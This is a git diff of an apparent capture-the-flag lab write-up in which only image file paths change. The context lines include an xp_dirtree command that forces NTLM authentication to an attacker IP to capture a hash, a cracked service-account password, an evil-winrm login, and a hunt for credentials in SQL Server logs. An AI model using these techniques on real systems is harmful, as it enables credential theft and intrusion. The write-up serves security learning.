@@ -112,7 +112,7 @@ EXEC xp_dirtree '\\10.10.14.7\share'
 
 Afterwards, we would capture an NTLM hash.
 
-<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (1) (9).png" alt=""><figcaption></figcaption></figure>
 
 We can try to crack this hash via whatever method available to find this password:
 
@@ -127,7 +127,7 @@ REGGIE1234ronnie (sql_svc)
 
 With these credentials, I was able to login via `evil-winrm`.
 
-<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (24) (6).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -137,7 +137,7 @@ This user did not have the flag or any other local privileges. However, since we
 
 Within the `C:\SQLServer\Logs` file, we can find an ERRORLOG file:
 
-<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Within that file, we can find some credentials:
 
